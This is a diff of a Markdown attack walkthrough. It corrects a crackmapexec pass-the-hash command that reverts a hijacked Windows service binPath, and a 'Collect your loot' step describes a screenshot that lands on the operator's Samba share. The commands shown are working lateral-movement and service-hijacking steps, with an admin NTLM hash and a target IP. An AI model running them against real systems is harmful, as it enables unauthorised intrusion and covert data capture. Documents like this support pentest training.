@@ -484,7 +484,7 @@ The binPath for the service you identified in step 1 will be changed to run your
 `crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc start GoogleChromeElevationService'`<br /><br />
 (revert the binPath on the service - both example services shown)<br />
 `crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "C:\WINDOWS\system32\svchost.exe -k netsvcs -p"'`<br /><br />
-`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config AppMgmt binPath= "\"C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe\""'`<br />
+`crackmapexec smb 192.168.1.242 -u administrator -d WIN10PRO -H a75001b474226887ca86ef09e1ae01ce --exec-method wmiexec -x 'sc config GoogleChromeElevationService binPath= "\"C:\Program Files (x86)\Google\Chrome\Application\74.0.3729.131\elevation_service.exe\""'`<br />
 
 ## (Step 6) Collect your loot
 If everything executed properly and your samba share had guest write access enabled then you should see a PNG graphic file named `screenshot.png` in the upload directory.
